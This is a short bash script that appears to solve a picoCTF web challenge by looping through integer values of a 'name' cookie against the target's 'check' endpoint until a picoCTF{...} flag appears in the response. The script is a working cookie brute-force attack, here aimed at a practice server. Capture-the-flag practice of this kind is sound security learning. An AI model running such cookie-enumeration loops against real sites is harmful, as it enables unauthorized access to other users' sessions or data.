# Clear dump
if [ -d build/ ]
then
    rm -rf build/
fi

mkdir build
pushd build/ > /dev/null

webLink=$1
for ((i = 0; ; i++)); do
    response=$(curl --silent "$webLink""check" -H "Cookie: name=$i")
    flag=$(echo "$response" | grep -o picoCTF{.*})
    if [[ -n "$flag" ]]; then
        break
    fi
done

popd > /dev/null

# print the flag
echo $flag
